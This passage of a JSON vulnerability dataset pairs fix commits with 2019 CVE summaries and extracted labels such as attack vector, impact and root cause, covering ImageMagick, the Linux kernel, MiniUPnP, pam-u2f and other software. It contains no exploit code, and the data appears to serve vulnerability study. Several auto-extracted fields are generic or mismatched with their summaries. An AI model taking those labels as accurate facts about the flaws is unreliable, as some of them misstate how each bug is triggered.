flaw","Attack Type":"local attacker"},{"commit_id":"c509265c5f6ae7264f7b8a8aae1cfa5fc59d108c","cve_id":"CVE-2019-13225","cwe_id":"CWE-476","commit_message":"Fix CVE-2019-13225: problem in converting if-then-else pattern to bytecode.","summary":"A NULL Pointer Dereference in match_at() in regexec.c in Oniguruma 6.9.2 allows attackers to potentially cause denial of service by providing a crafted regular expression. Oniguruma issues often affect Ruby, as well as common optional libraries for PHP and Rust.","commit_message_1":"fix <cve_id> : problem in converting if-then-else pattern to bytecode","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"by providing a crafted regular expression","Impact":"potentially cause denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"attacker"},{"commit_id":"0f7f61ed1b7b697e283e37bd2d731d0bd57adb55","cve_id":"CVE-2019-13224","cwe_id":"CWE-416","commit_message":"Fix CVE-2019-13224: don't allow different encodings for onig_new_deluxe()","summary":"A use-after-free in onig_new_deluxe() in regext.c in Oniguruma 6.9.2 allows attackers to potentially cause information disclosure, denial of service, or possibly code execution by providing a crafted regular expression. The attacker provides a pair of a regex pattern and a string, with a multi-byte encoding that gets handled by onig_new_deluxe(). Oniguruma issues often affect Ruby, as well as common optional libraries for PHP and Rust.","commit_message_1":"fix <cve_id> : do n't allow different encoding for onig_new_deluxe ( )","Vulnerability Type":"Use After Free","Attack Vector":"by providing a crafted regular expression","Impact":"potentially cause information disclosure , denial of service , or possibly code execution","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"98fdfc6df88b1e34a736d5e126e6c8139c8de1a6","cve_id":"CVE-2019-13223","cwe_id":"CWE-20","commit_message":"Fix seven bugs discovered and fixed by ForAllSecure:\n\nCVE-2019-13217: heap buffer overflow in start_decoder()\nCVE-2019-13218: stack buffer overflow in compute_codewords()\nCVE-2019-13219: uninitialized memory in vorbis_decode_packet_rest()\nCVE-2019-13220: out-of-range read in draw_line()\nCVE-2019-13221: issue with large 1D codebooks in lookup1_values()\nCVE-2019-13222: unchecked NULL returned by get_window()\nCVE-2019-13223: division by zero in predict_point()","summary":"A reachable assertion in the lookup1_values function in stb_vorbis through 2019-03-04 allows an attacker to cause a denial of service by opening a crafted Ogg Vorbis file.","commit_message_1":"fix seven bug discovered and fixed by forallsecure :","Vulnerability Type":"Improper Input Validation","Attack Vector":"by opening a crafted ogg vorbis file","Impact":"cause a denial of service","Root Cause":"caused by a reachable assertion","Attack Type":"remote attacker"},{"commit_id":"7d11230060fa9c8f67e53c85224daf6648805c7b","cve_id":"CVE-2019-13137","cwe_id":"CWE-399","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1601","summary":"ImageMagick before 7.0.8-50 has a memory leak vulnerability in the function ReadPSImage in coders\/ps.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Resource Management Errors","Attack Vector":"By persuading a victim to open a specially crafted file","Impact":"cause a denial of service","Root Cause":"caused by a memory leak","Attack Type":"remote attacker"},{"commit_id":"fe5f4b85e6b1b54d3b4588a77133c06ade46d891","cve_id":"CVE-2019-13136","cwe_id":"CWE-190","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1602","summary":"ImageMagick before 7.0.8-50 has an integer overflow vulnerability in the function TIFFSeekCustomStream in coders\/tiff.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"integer overflow","Attack Vector":"By persuading a victim to open a specially crafted file","Impact":"overflow a buffer and execute arbitrary code on the system","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"cdb383749ef7b68a38891440af8cc23e0115306d","cve_id":"CVE-2019-13135","cwe_id":"CWE-20","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1599","summary":"ImageMagick before 7.0.8-50 has a *use of uninitialized value* vulnerability in the function ReadCUTImage in coders\/cut.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Improper Input Validation","Attack Vector":"By persuading a victim to open a specially crafted file","Impact":"cause a denial of service","Root Cause":"caused by an uninitialized value vulnerability","Attack Type":"remote attacker"},{"commit_id":"fe3066122ef72c82415811d25e9e3fad622c0a99","cve_id":"CVE-2019-13134","cwe_id":"CWE-399","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/1600","summary":"ImageMagick before 7.0.8-50 has a memory leak vulnerability in the function ReadVIFFImage in coders\/viff.c.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Resource Management Errors","Attack Vector":"By persuading a victim to open a specially crafted file","Impact":"cause a denial of service","Root Cause":"caused by a memory leak","Attack Type":"remote attacker"},{"commit_id":"d23b0d22cc611e43c88d99192a59f413f951a955","cve_id":"CVE-2019-13045","cwe_id":"CWE-416","commit_message":"Merge pull request #1058 from ailin-nemui\/sasl-reconnect\n\ncopy sasl username and password values","summary":"Irssi before 1.0.8, 1.1.x before 1.1.3, and 1.2.x before 1.2.1, when SASL is enabled, has a use after free when sending SASL login to the server.","commit_message_1":"merge pull request # <number> from ailin-nemui\/sasl-reconnect","Vulnerability Type":"Use After Free","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by a use-after-free when sending SASL login to the server.","Attack Type":"remote attacker"},{"commit_id":"385097a3675749cbc9e97c085c0e5dfe4269ca51","cve_id":"CVE-2019-12984","cwe_id":"CWE-476","commit_message":"nfc: Ensure presence of required attributes in the deactivate_target handler\n\nCheck that the NFC_ATTR_TARGET_INDEX attributes (in addition to\nNFC_ATTR_DEVICE_INDEX) are provided by the netlink client prior to\naccessing them. This prevents potential unhandled NULL pointer dereference\nexceptions which can be triggered by malicious user-mode programs,\nif they omit one or both of these attributes.\n\nSigned-off-by: Young Xiao <92siuyang@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"A NULL pointer dereference vulnerability in the function nfc_genl_deactivate_target() in net\/nfc\/netlink.c in the Linux kernel before 5.1.13 can be triggered by a malicious user-mode program that omits certain NFC attributes, leading to denial of service.","commit_message_1":"ensure presence of required attribute in the deactivate_target handler check that the nfc_attr_target_index attribute ( in addition to nfc_attr_device_index ) are provided by the netlink client prior to accessing them","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By persuading a victim to execute a specially-crafted program","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"8ee335227bbcaf1614124046aa25e53d67b11ec3","cve_id":"CVE-2019-12973","cwe_id":"CWE-400","commit_message":"convertbmp: detect invalid file dimensions early\n\nwidth\/length dimensions read from bmp headers are not necessarily\nvalid. For instance they may have been maliciously set to very large\nvalues with the intention to cause DoS (large memory allocation, stack\noverflow). In these cases we want to detect the invalid size as early\nas possible.\n\nThis commit introduces a counter which verifies that the number of\nwritten bytes corresponds to the advertized width\/length.\n\nFixes #1059 (CVE-2018-6616).","summary":"In OpenJPEG 2.3.1, there is excessive iteration in the opj_t1_encode_cblks function of openjp2\/t1.c. Remote attackers could leverage this vulnerability to cause a denial of service via a crafted bmp file. This issue is similar to CVE-2018-6616.","commit_message_1":"detect invalid file dimension early width\/length dimension read from bmp header are not necessarily valid","Vulnerability Type":"Uncontrolled Resource Consumption","Attack Vector":"via a crafted bmp file","Impact":"cause a denial of service","Root Cause":"caused by an excessive iteration flaw","Attack Type":"remote attacker"},{"commit_id":"b3e0f780c34cea88f057a62213c012aa88fe2deb","cve_id":"CVE-2019-12951","cwe_id":"CWE-119","commit_message":"Fix heap-based overflow in parse_mqtt\n\nPUBLISHED_FROM=3306592896298597fff5269634df0c1a1555113b","summary":"An issue was discovered in Mongoose before 6.15. The parse_mqtt() function in mg_mqtt.c has a critical heap-based buffer overflow.","commit_message_1":"fix heap-based overflow in parse_mqtt","Vulnerability Type":"buffer overflow","Attack Vector":"An issue was discovered in Mongoose","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper bounds checking by the parse_mqtt() function","Attack Type":"remote attacker"},{"commit_id":"a4c561aab1014c3630bc88faf6f5246fee16b020","cve_id":"CVE-2019-12904","cwe_id":"CWE-310","commit_message":"GCM: move look-up table to .data section and unshare between processes\n\n* cipher\/cipher-gcm.c (ATTR_ALIGNED_64): New.\n(gcmR): Move to 'gcm_table' structure.\n(gcm_table): New structure for look-up table with counters before and\nafter.\n(gcmR): New macro.\n(prefetch_table): Handle input with length not multiple of 256.\n(do_prefetch_tables): Modify pre- and post-table counters to unshare\nlook-up table pages between processes.\n--\n\nGnuPG-bug-id: 4541\nSigned-off-by: Jussi Kivilinna <jussi.kivilinna@iki.fi>","summary":"In Libgcrypt 1.8.4, the C implementation of AES is vulnerable to a flush-and-reload side-channel attack because physical addresses are available to other processes. (The C implementation is used on platforms where an assembly-language implementation is unavailable.)","commit_message_1":"move look-up table to","Vulnerability Type":"Cryptographic Issues","Attack Vector":"By using a flush-and-reload side-channel attack","Impact":"obtain sensitive information","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"6ff7b060535e87c2ae14dd8548512abfdda528fb","cve_id":"CVE-2019-12819","cwe_id":"CWE-416","commit_message":"mdio_bus: Fix use-after-free on device_register fails\n\nKASAN has found use-after-free in fixed_mdio_bus_init,\ncommit 0c692d07842a (\"drivers\/net\/phy\/mdio_bus.c: call\nput_device on device_register() failure\") call put_device()\nwhile device_register() fails,give up the last reference\nto the device and allow mdiobus_release to be executed\n,kfreeing the bus. However in most drives, mdiobus_free\nbe called to free the bus while mdiobus_register fails.\nuse-after-free occurs when access bus again, this patch\nrevert it to let mdiobus_free free the bus.\n\nKASAN report details as below:\n\nBUG: KASAN: use-after-free in mdiobus_free+0x85\/0x90 drivers\/net\/phy\/mdio_bus.c:482\nRead of size 4 at addr ffff8881dc824d78 by task syz-executor.0\/3524\n\nCPU: 1 PID: 3524 Comm: syz-executor.0 Not tainted 5.0.0-rc7+ #45\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04\/01\/2014\nCall Trace:\n __dump_stack lib\/dump_stack.c:77 [inline]\n dump_stack+0xfa\/0x1ce lib\/dump_stack.c:113\n print_address_description+0x65\/0x270 mm\/kasan\/report.c:187\n kasan_report+0x149\/0x18d mm\/kasan\/report.c:317\n mdiobus_free+0x85\/0x90 drivers\/net\/phy\/mdio_bus.c:482\n fixed_mdio_bus_init+0x283\/0x1000 [fixed_phy]\n ? 0xffffffffc0e40000\n ? 0xffffffffc0e40000\n ? 0xffffffffc0e40000\n do_one_initcall+0xfa\/0x5ca init\/main.c:887\n do_init_module+0x204\/0x5f6 kernel\/module.c:3460\n load_module+0x66b2\/0x8570 kernel\/module.c:3808\n __do_sys_finit_module+0x238\/0x2a0 kernel\/module.c:3902\n do_syscall_64+0x147\/0x600 arch\/x86\/entry\/common.c:290\n entry_SYSCALL_64_after_hwframe+0x49\/0xbe\nRIP: 0033:0x462e99\nCode: f7 d8 64 89 02 b8 ff ff ff ff c3 66 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 bc ff ff ff f7 d8 64 89 01 48\nRSP: 002b:00007f6215c19c58 EFLAGS: 00000246 ORIG_RAX: 0000000000000139\nRAX: ffffffffffffffda RBX: 000000000073bf00 RCX: 0000000000462e99\nRDX: 0000000000000000 RSI: 0000000020000080 RDI: 0000000000000003\nRBP: 00007f6215c19c70 R08: 0000000000000000 R09: 0000000000000000\nR10: 0000000000000000 R11: 0000000000000246 R12: 00007f6215c1a6bc\nR13: 00000000004bcefb R14: 00000000006f7030 R15: 0000000000000004\n\nAllocated by task 3524:\n set_track mm\/kasan\/common.c:85 [inline]\n __kasan_kmalloc.constprop.3+0xa0\/0xd0 mm\/kasan\/common.c:496\n kmalloc include\/linux\/slab.h:545 [inline]\n kzalloc include\/linux\/slab.h:740 [inline]\n mdiobus_alloc_size+0x54\/0x1b0 drivers\/net\/phy\/mdio_bus.c:143\n fixed_mdio_bus_init+0x163\/0x1000 [fixed_phy]\n do_one_initcall+0xfa\/0x5ca init\/main.c:887\n do_init_module+0x204\/0x5f6 kernel\/module.c:3460\n load_module+0x66b2\/0x8570 kernel\/module.c:3808\n __do_sys_finit_module+0x238\/0x2a0 kernel\/module.c:3902\n do_syscall_64+0x147\/0x600 arch\/x86\/entry\/common.c:290\n entry_SYSCALL_64_after_hwframe+0x49\/0xbe\n\nFreed by task 3524:\n set_track mm\/kasan\/common.c:85 [inline]\n __kasan_slab_free+0x130\/0x180 mm\/kasan\/common.c:458\n slab_free_hook mm\/slub.c:1409 [inline]\n slab_free_freelist_hook mm\/slub.c:1436 [inline]\n slab_free mm\/slub.c:2986 [inline]\n kfree+0xe1\/0x270 mm\/slub.c:3938\n device_release+0x78\/0x200 drivers\/base\/core.c:919\n kobject_cleanup lib\/kobject.c:662 [inline]\n kobject_release lib\/kobject.c:691 [inline]\n kref_put include\/linux\/kref.h:67 [inline]\n kobject_put+0x146\/0x240 lib\/kobject.c:708\n put_device+0x1c\/0x30 drivers\/base\/core.c:2060\n __mdiobus_register+0x483\/0x560 drivers\/net\/phy\/mdio_bus.c:382\n fixed_mdio_bus_init+0x26b\/0x1000 [fixed_phy]\n do_one_initcall+0xfa\/0x5ca init\/main.c:887\n do_init_module+0x204\/0x5f6 kernel\/module.c:3460\n load_module+0x66b2\/0x8570 kernel\/module.c:3808\n __do_sys_finit_module+0x238\/0x2a0 kernel\/module.c:3902\n do_syscall_64+0x147\/0x600 arch\/x86\/entry\/common.c:290\n entry_SYSCALL_64_after_hwframe+0x49\/0xbe\n\nThe buggy address belongs to the object at ffff8881dc824c80\n which belongs to the cache kmalloc-2k of size 2048\nThe buggy address is located 248 bytes inside of\n 2048-byte region [ffff8881dc824c80, ffff8881dc825480)\nThe buggy address belongs to the page:\npage:ffffea0007720800 count:1 mapcount:0 mapping:ffff8881f6c02800 index:0x0 compound_mapcount: 0\nflags: 0x2fffc0000010200(slab|head)\nraw: 02fffc0000010200 0000000000000000 0000000500000001 ffff8881f6c02800\nraw: 0000000000000000 00000000800f000f 00000001ffffffff 0000000000000000\npage dumped because: kasan: bad access detected\n\nMemory state around the buggy address:\n ffff8881dc824c00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n ffff8881dc824c80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n>ffff8881dc824d00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n                                                                ^\n ffff8881dc824d80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n ffff8881dc824e00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n\nFixes: 0c692d07842a (\"drivers\/net\/phy\/mdio_bus.c: call put_device on device_register() failure\")\nSigned-off-by: YueHaibing <yuehaibing@huawei.com>\nReviewed-by: Andrew Lunn <andrew@lunn.ch>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"An issue was discovered in the Linux kernel before 5.0. The function __mdiobus_register() in drivers\/net\/phy\/mdio_bus.c calls put_device(), which will trigger a fixed_mdio_bus_init use-after-free. This will cause a denial of service.","commit_message_1":"fix use-after-free on device_register fails kasan ha found use-after-free in fixed_mdio_bus_init , commit 0c692d07842a ( `` drivers\/net\/phy\/<file> : call put_device on device_register ( ) failure '' ) call put_device ( ) while device_register ( ) fails , give up the last reference to the device and allow mdiobus_release to be executed , kfreeing the bus","Vulnerability Type":"Use After Free","Attack Vector":"By sending a specially-crafted command","Impact":"cause a denial of service","Root Cause":"caused by a use-after-free","Attack Type":"local attacker"},{"commit_id":"58bdd544e2933a21a51eecf17c3f5f94038261b5","cve_id":"CVE-2019-12818","cwe_id":"CWE-476","commit_message":"net: nfc: Fix NULL dereference on nfc_llcp_build_tlv fails\n\nKASAN report this:\n\nBUG: KASAN: null-ptr-deref in nfc_llcp_build_gb+0x37f\/0x540 [nfc]\nRead of size 3 at addr 0000000000000000 by task syz-executor.0\/5401\n\nCPU: 0 PID: 5401 Comm: syz-executor.0 Not tainted 5.0.0-rc7+ #45\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04\/01\/2014\nCall Trace:\n __dump_stack lib\/dump_stack.c:77 [inline]\n dump_stack+0xfa\/0x1ce lib\/dump_stack.c:113\n kasan_report+0x171\/0x18d mm\/kasan\/report.c:321\n memcpy+0x1f\/0x50 mm\/kasan\/common.c:130\n nfc_llcp_build_gb+0x37f\/0x540 [nfc]\n nfc_llcp_register_device+0x6eb\/0xb50 [nfc]\n nfc_register_device+0x50\/0x1d0 [nfc]\n nfcsim_device_new+0x394\/0x67d [nfcsim]\n ? 0xffffffffc1080000\n nfcsim_init+0x6b\/0x1000 [nfcsim]\n do_one_initcall+0xfa\/0x5ca init\/main.c:887\n do_init_module+0x204\/0x5f6 kernel\/module.c:3460\n load_module+0x66b2\/0x8570 kernel\/module.c:3808\n __do_sys_finit_module+0x238\/0x2a0 kernel\/module.c:3902\n do_syscall_64+0x147\/0x600 arch\/x86\/entry\/common.c:290\n entry_SYSCALL_64_after_hwframe+0x49\/0xbe\nRIP: 0033:0x462e99\nCode: f7 d8 64 89 02 b8 ff ff ff ff c3 66 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 bc ff ff ff f7 d8 64 89 01 48\nRSP: 002b:00007f9cb79dcc58 EFLAGS: 00000246 ORIG_RAX: 0000000000000139\nRAX: ffffffffffffffda RBX: 000000000073bf00 RCX: 0000000000462e99\nRDX: 0000000000000000 RSI: 0000000020000280 RDI: 0000000000000003\nRBP: 00007f9cb79dcc70 R08: 0000000000000000 R09: 0000000000000000\nR10: 0000000000000000 R11: 0000000000000246 R12: 00007f9cb79dd6bc\nR13: 00000000004bcefb R14: 00000000006f7030 R15: 0000000000000004\n\nnfc_llcp_build_tlv will return NULL on fails, caller should check it,\notherwise will trigger a NULL dereference.\n\nReported-by: Hulk Robot <hulkci@huawei.com>\nFixes: eda21f16a5ed (\"NFC: Set MIU and RW values from CONNECT and CC LLCP frames\")\nFixes: d646960f7986 (\"NFC: Initial LLCP support\")\nSigned-off-by: YueHaibing <yuehaibing@huawei.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"An issue was discovered in the Linux kernel before 4.20.15. The nfc_llcp_build_tlv function in net\/nfc\/llcp_commands.c may return NULL. If the caller does not check for this, it will trigger a NULL pointer dereference. This will cause denial of service. This affects nfc_llcp_build_gb in net\/nfc\/llcp_core.c.","commit_message_1":"nfc : fix null dereference on nfc_llcp_build_tlv fails kasan report this : bug : kasan : null-ptr-deref in nfc_llcp_build_gb+0x37f\/0x540 [ nfc ] read of size <number> at addr <number> by task syz-<file>\/<number> cpu : <number> pid : <number> comm : syz-<file> not tainted <file>","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By sending a specially-crafted command","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"8de9e376ce531fe7f3c8b0aa4876d15b479b7311","cve_id":"CVE-2019-12816","cwe_id":"CWE-264","commit_message":"Fix remote code execution and privilege escalation vulnerability.\n\nTo trigger this, need to have a user already.\n\nThanks for Jeriko One <jeriko.one@gmx.us> for finding and reporting this.\n\nCVE-2019-12816","summary":"Modules.cpp in ZNC before 1.7.4-rc1 allows remote authenticated non-admin users to escalate privileges and execute arbitrary code by loading a module with a crafted name.","commit_message_1":"fix remote code execution and privilege escalation vulnerability","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by loading a module with a crafted name","Impact":"escalate privileges and execute arbitrary code","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"ed188f6dcdf0935c939ed813cf8745d50742014b","cve_id":"CVE-2019-12730","cwe_id":"CWE-665","commit_message":"avformat\/aadec: Check for scanf() failure\n\nFixes: use of uninitialized variables\nFixes: blank.aa\n\nFound-by: Chamal De Silva <chamal.desilva@gmail.com>\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"aa_read_header in libavformat\/aadec.c in FFmpeg before 3.2.14 and 4.x before 4.1.4 does not check for sscanf failure and consequently allows use of uninitialized variables.","commit_message_1":"avformat\/aadec : check for scanf ( ) failure","Vulnerability Type":"Improper Initialization","Attack Vector":"by the failure to check for sscanf failure by the aa_read_header function","Impact":"bypass security restrictions","Root Cause":"does not check for sscanf failure and","Attack Type":"attacker"},{"commit_id":"eecf35c2f8249489a1d3e512bb07f0d427183134","cve_id":"CVE-2019-12589","cwe_id":"CWE-284","commit_message":"mount runtime seccomp files read-only (#2602)\n\navoid creating locations in the file system that are both writable and\nexecutable (in this case for processes with euid of the user).\n\nfor the same reason also remove user owned libfiles\nwhen it is not needed any more","summary":"In Firejail before 0.9.60, seccomp filters are writable inside the jail, leading to a lack of intended seccomp restrictions for a process that is joined to the jail after a filter has been modified by an attacker.","commit_message_1":"mount runtime seccomp file read-only ( # <number> ) avoid creating location in the file system that are both writable and executable ( in this case for process with euid of the user )","Vulnerability Type":"Improper Access Control","Attack Vector":"By sending a specially-crafted request","Impact":"bypass security restrictions","Root Cause":"caused by a flaw when seccomp filters are copied into \/run\/firejail\/mnt","Attack Type":"local attacker"},{"commit_id":"v4","cve_id":"CVE-2019-12529","cwe_id":"CWE-200","commit_message":"4.10 (#547)","summary":"An issue was discovered in Squid 2.x through 2.7.STABLE9, 3.x through 3.5.28, and 4.x through 4.7. When Squid is configured to use Basic Authentication, the Proxy-Authorization header is parsed via uudecode. uudecode determines how many bytes will be decoded by iterating over the input and checking its table. The length is then used to start decoding the string. There are no checks to ensure that the length it calculates isn't greater than the input buffer. This leads to adjacent memory being decoded as well. An attacker would not be able to retrieve the decoded data unless the Squid maintainer had configured the display of usernames on error pages.","commit_message_1":"<file> ( # <number> )","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"By sending an overly long string","Impact":"obtain sensitive information","Root Cause":"caused by an error when Squid is configured to use Basic Authentication","Attack Type":"remote attacker"},{"commit_id":"efc89e3b939b4bde42c10f065f6b7b02958ed50e","cve_id":"CVE-2019-12439","cwe_id":"CWE-20","commit_message":"Don't create our own temporary mount point for pivot_root\n\nAn attacker could pre-create \/tmp\/.bubblewrap-$UID and make it a\nnon-directory, non-symlink (in which case mounting our tmpfs would fail,\ncausing denial of service), or make it a symlink under their control\n(potentially allowing bad things if the protected_symlinks sysctl is\nnot enabled).\n\nInstead, temporarily mount the tmpfs on a directory that we are sure\nexists and is not attacker-controlled. \/tmp (the directory itself, not\na subdirectory) will do.\n\nFixes: #304\nBug-Debian: https:\/\/bugs.debian.org\/cgi-bin\/bugreport.cgi?bug=923557\nSigned-off-by: Simon McVittie <smcv@debian.org>\n\nCloses: #305\nApproved by: cgwalters","summary":"bubblewrap.c in Bubblewrap before 0.3.3 misuses temporary directories in \/tmp as a mount point. In some particular configurations (related to XDG_RUNTIME_DIR), a local attacker may abuse this flaw to prevent other users from executing bubblewrap or potentially execute code.","commit_message_1":"do n't create our own temporary mount point for pivot_root an attacker could pre-create \/tmp\/","Vulnerability Type":"Improper Input Validation","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by the misuses of temporary directories","Attack Type":"local attacker"},{"commit_id":"18b1914e32b74ff52000f10e97067e841e5fff62","cve_id":"CVE-2019-12210","cwe_id":"CWE-200","commit_message":"Do not leak file descriptor when doing exec\n\nWhen opening a custom debug file, the descriptor would stay\nopen when calling exec and leak to the child process.\n\nMake sure all files are opened with close-on-exec.\n\nThis fixes CVE-2019-12210.\n\nThanks to Matthias Gerstner of the SUSE Security Team for reporting\nthe issue.","summary":"In Yubico pam-u2f 1.0.7, when configured with debug and a custom debug log file is set using debug_file, that file descriptor is not closed when a new process is spawned. This leads to the file descriptor being inherited into the child process; the child process can then read from and write to it. This can leak sensitive information and also, if written to, be used to fill the disk or plant misinformation.","commit_message_1":"do not leak file descriptor when doing exec when opening a custom debug file , the descriptor would stay open when calling exec and leak to the child process","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"By sending a specially-crafted request","Impact":"bypass security restrictions","Root Cause":"caused by an issue when the file descriptor is not closed when a new process is spawned","Attack Type":"local attacker"},{"commit_id":"7db3386fcdb454e33a3ea30dcfb8e8960d4c3aa3","cve_id":"CVE-2019-12209","cwe_id":"CWE-200","commit_message":"Drop privileges by default when opening user-related files\n\nThe module is typically executed as root and would sometimes\nopen files or follow symlinks that could be controlled from the\noutside.\n\nDrop privileges to the target user before opening any files.\n\nFixes CVE-2019-12209.\n\nThanks to Matthias Gerstner of the SUSE Security Team for reporting\nthe issue.","summary":"Yubico pam-u2f 1.0.7 attempts parsing of the configured authfile (default $HOME\/.config\/Yubico\/u2f_keys) as root (unless openasuser was enabled), and does not properly verify that the path lacks symlinks pointing to other files on the system owned by root. If the debug option is enabled in the PAM configuration, part of the file contents of a symlink target will be logged, possibly revealing sensitive information.","commit_message_1":"drop privilege by default when opening user-related file the module is typically executed a root and would sometimes open file or follow symlinks that could be controlled from the outside","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"When the debug option is enabled in PAM configuration","Impact":"obtain sensitive information","Root Cause":"caused by the failure to properly verify that the path lacks symlinks pointing to other files on the system owned by root","Attack Type":"local attacker"},{"commit_id":"cb8a02af7a5677cf608e86d57ab04241cf34e24f","cve_id":"CVE-2019-12111","cwe_id":"CWE-476","commit_message":"pcpserver.c: copyIPv6IfDifferent() check for NULL src argument","summary":"A Denial Of Service vulnerability in MiniUPnP MiniUPnPd through 2.1 exists due to a NULL pointer dereference in copyIPv6IfDifferent in pcpserver.c.","commit_message_1":"<file> : copyipv6ifdifferent ( ) check for null src argument","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By sending a specially crafted request","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"f321c2066b96d18afa5158dfa2d2873a2957ef38","cve_id":"CVE-2019-12110","cwe_id":"CWE-476","commit_message":"upnp_redirect(): accept NULL desc argument","summary":"An AddPortMapping Denial Of Service vulnerability in MiniUPnP MiniUPnPd through 2.1 exists due to a NULL pointer dereference in upnpredirect.c.","commit_message_1":"upnp_redirect ( ) : accept null desc argument","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By sending a specially crafted request","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"13585f15c7f7dc28bbbba1661efb280d530d114c","cve_id":"CVE-2019-12109","cwe_id":"CWE-476","commit_message":"GetOutboundPinholeTimeout: check args","summary":"A Denial Of Service vulnerability in MiniUPnP MiniUPnPd through 2.1 exists due to a NULL pointer dereference in GetOutboundPinholeTimeout in upnpsoap.c for rem_port.","commit_message_1":"getoutboundpinholetimeout : check args","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By sending a specially crafted request","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"bec6ccec63cadc95655721bc0e1dd49dac759d94","cve_id":"CVE-2019-12107","cwe_id":"CWE-200","commit_message":"upnp_event_prepare(): check the return value of snprintf()","summary":"The upnp_event_prepare function in upnpevents.c in MiniUPnP MiniUPnPd through 2.1 allows a remote attacker to leak information from the heap due to improper validation of an snprintf return value.","commit_message_1":"upnp_event_prepare ( ) : check the return value of snprintf ( )","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"By using a specially crafted callback address","Impact":"leak information from the heap due to improper validation of an snprintf return value","Root Cause":"caused by improper validation of return value","Attack Type":"remote attacker"},{"commit_id":"cd506a67e174a45c6a202eff182a712955ed6d6f","cve_id":"CVE-2019-12106","cwe_id":"CWE-416","commit_message":"updateDevice() remove element from the list when realloc fails","summary":"The updateDevice function in minissdpd.c in MiniUPnP MiniSSDPd 1.4 and 1.5 allows a remote attacker to crash the process due to a Use After Free vulnerability.","commit_message_1":"updatedevice ( ) remove element from the list when realloc fails","Vulnerability Type":"Use After Free","Attack Vector":"By sending specially crafted request","Impact":"crash the process due to a use after free vulnerability","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"2f7f3d9960aa6ea21358bdf3687cee5149aa35cf","cve_id":"CVE-2019-12098","cwe_id":"CWE-320","commit_message":"CVE-2019-12098: krb5: always confirm PA-PKINIT-KX for anon PKINIT\n\nRFC8062 Section 7 requires verification of the PA-PKINIT-KX key excahnge\nwhen anonymous PKINIT is used.  Failure to do so can permit an active\nattacker to become a man-in-the-middle.\n\nIntroduced by a1ef548600c5bb51cf52a9a9ea12676506ede19f.  First tagged\nrelease Heimdal 1.4.0.\n\nCVSS:3.0\/AV:N\/AC:H\/PR:N\/UI:N\/S:U\/C:L\/I:L\/A:N (4.8)\n\nChange-Id: I6cc1c0c24985936468af08693839ac6c3edda133\nSigned-off-by: Jeffrey Altman <jaltman@auristor.com>\nApproved-by: Jeffrey Altman <jaltman@auritor.com>\n(cherry picked from commit 38c797e1ae9b9c8f99ae4aa2e73957679031fd2b)","summary":"In the client side of Heimdal before 7.6.0, failure to verify anonymous PKINIT PA-PKINIT-KX key exchange permits a man-in-the-middle attack. This issue is in krb5_init_creds_step in lib\/krb5\/init_creds_pw.c.","commit_message_1":"krb5 : always confirm pa-pkinit-kx for anon pkinit rfc8062 section <number> requires verification of the 